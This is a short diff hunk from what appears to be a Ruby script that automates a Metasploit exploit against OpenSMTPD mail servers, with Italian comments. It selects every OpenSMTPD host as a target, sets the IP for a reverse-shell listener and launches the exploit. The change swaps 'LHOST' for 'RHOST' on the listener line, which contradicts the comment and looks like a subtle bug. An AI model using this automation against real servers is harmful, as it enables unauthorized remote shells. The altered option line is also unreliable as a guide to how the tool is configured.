@@ -102,7 +102,7 @@ def execute_attack(workspace, targetIPs, listeningIP)
     # imposta come obiettivo dell'exploit tutti i server opensmtpd
     run_single("services -S opensmtpd -R")
     # imposta l'indirizzo ip su cui avviare il listener per la reverse shell
-    run_single("set LHOST #{listeningIP}")
+    run_single("set RHOST #{listeningIP}")
     # COMPATIBILITY MOD
     run_single("set TARGET 0")
     # esegue exploit
